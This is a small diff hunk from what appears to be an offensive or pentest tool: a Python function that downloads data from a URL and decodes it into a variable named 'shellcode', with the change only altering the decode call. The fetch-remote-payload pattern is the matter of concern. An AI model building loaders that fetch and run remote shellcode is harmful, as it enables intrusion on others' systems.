@@ -50,7 +50,7 @@ def run(**args):
     #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
     print(r.data)
-    shellcode = r.data.decode('utf-8')
+    shellcode = r.data.decode()
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
   	return "getFileFromURI: HTTP Error 404: File not found"
